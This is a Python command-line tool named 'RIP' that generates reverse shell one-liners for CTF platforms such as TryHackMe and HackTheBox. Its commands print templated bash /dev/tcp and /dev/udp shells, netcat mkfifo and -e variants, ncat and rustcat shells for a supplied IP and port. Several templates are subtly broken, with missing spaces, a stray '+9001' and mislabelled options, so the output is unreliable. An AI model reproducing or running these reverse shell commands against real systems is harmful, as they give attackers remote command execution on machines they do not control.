import click
from click.decorators import group
from click.termui import prompt, style
from click.utils import echo
from pyfiglet import figlet_format
import rich
from rich.console import Console
from rich.table import Table
import time
from rich.progress import Progress
from rich import print
from rich import console
from termcolor import colored
from rich.style import Style

print("""

           _.---,._,'
       /' _.--.<                      
         /'     `'                Reverse Shell Generator
       /' _.---._____             
       \.'   ___, .-'`                 V = 1.1
           /'    \\             .
         /'       `-.          -|-
        |                       |
        |                   .-'~~~`-.
        |                 .'         `.
        |                 |  R  I  P  |
  999   |                 |           |
        |                 |           |
          \              \\|           |//
   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
""")

rich.print(" ---  DESCRIPTION  --- ")
rich.print("""  

 RIP is a simple CLI tool helps to Generator the 
 reverse shell within the terminal. It can only
 generator few shells here. Hope Rip will be 
 useful to obtain flags in Tryhackme & Hackthebox !
 Thanks for using RIP. Happy Hacking and Have a
 nice Day !

  BUY ME A COFFEE ===> https://ko-fi.com/rip2277
    
  LinkedIn ===> https://www.linkedin.com/in/rajuaravind-s-1828481a0/  

""")



with Progress() as progress:



    task2 = progress.add_task("[bold green]InitialiZing RIP...", total=1000)



    while not progress.finished:
        progress.update(task2, advance=5)
        time.sleep(0.02)



        
table = Table(title="REVERSE SHELL GENERATOR")

table.add_column( "***  AVAILABLE SHELL @ RIP ***", style="bold magenta")

table.add_row( "Bash i")
table.add_row("Bash 196")
table.add_row( "Bash readline")
table.add_row( "Bash 5")
table.add_row("Bash udp")
table.add_row("nc_mkfifo")
table.add_row("nc_e")
table.add_row("nc.exe -e")
table.add_row("nc -c")
table.add_row("ncat -e")
table.add_row("ncat.exe -e")
table.add_row("ncat udp")
table.add_row('rustcat')



console = Console()
console.print(table)

console.print("                                ")
console.print("Version 1.1 ", style="bold red   ")
console.print("                                ")

@click.group()
def ripshellcli():
    pass



@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")



def bash_i(ip,port):
   click.echo("                                     ")  
   click.echo("  sh -i >& /dev/tcp/"+ ip +"/"+ port + ">&1   ")
   click.echo("                                     ")

    
    
@click.command()

@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def bash196(ip,port):

    click.echo("                                     ")
    click.echo("  0<&196;exec 196<>/dev/tcp/" +ip+ "/" +port+ "; bash <&196 >&196 2>&196   ")


@click.command()

@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def bash_read_line(ip,port):
    click.echo("                                     ")
    click.echo("  exec 5<>/dev/tcp/"+ip+"/"+port+";cat <&5 | while read line; do $line 2>&5 >&5; done  ")


@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def bash_5(ip,port):
    click.echo("                                     ")
    click.echo("  bash -i 5<> /dev/tcp/"+ip+"/"+port+"+9001 0<&5 1>&5 2>&5  ")    


@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def bash_udp(ip,port):
    click.echo("                                     ")
    click.echo("  bash -i >& /dev/udp/"+ip+"/"+port+" 0>&1  ")


@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def nc_mkfifo(ip,port):
    click.echo("                                     ")
    click.echo("   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc "+ip+ " " +port+" >/tmp/f   " )


@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def nc_e(ip,port):
    click.echo("                                     ")
    click.echo("   nc -e bash" +ip+" "+port+"   " )

@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def nc_exe_e(ip,port): 
    click.echo("                                     ")  
    click.echo("   nc -e bash" +ip+" "+port+"   ")

    

@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def nc_c(ip,port):
   click.echo("                                     ")    
   click.echo("   nc -c bash" +ip+" "+port+"  " )

@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def ncat_e(ip,port):
    click.echo("                                     ")
    click.echo("   ncat "+ip+"  " +port+ "-e bash  ")
   
@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def ncat_exe(ip,port):
      click.echo("                                     ")
      click.echo("  ncat.exe" +ip+ " "+port+ " -e bash  ")
   
@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")
@click.option('-port', '-p', help='respective port of the victim',required=True,prompt="port of victim's machine: ")

def ncat_udp(ip,port):
      click.echo("                                     ")
      click.echo("  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u "+ip+ " "+port+ " >/tmp/f  ")
   

@click.command()
@click.option('-ip','-ip', help='Name of the person using this', required=True, prompt="victim's ip adddress: ")

def rustcat(ip):
      click.echo("                                     ")
      click.echo("  rcat "+ip+ " -r bash  ")

   


ripshellcli.add_command(bash_i)
ripshellcli.add_command(bash196)
ripshellcli.add_command(bash_read_line)
ripshellcli.add_command(bash_5)
ripshellcli.add_command(bash_udp)
ripshellcli.add_command(nc_mkfifo)
ripshellcli.add_command(nc_e)
ripshellcli.add_command(nc_exe_e)
ripshellcli.add_command(nc_c)
ripshellcli.add_command(ncat_e)
ripshellcli.add_command(ncat_exe)
ripshellcli.add_command(ncat_udp)
ripshellcli.add_command(rustcat)



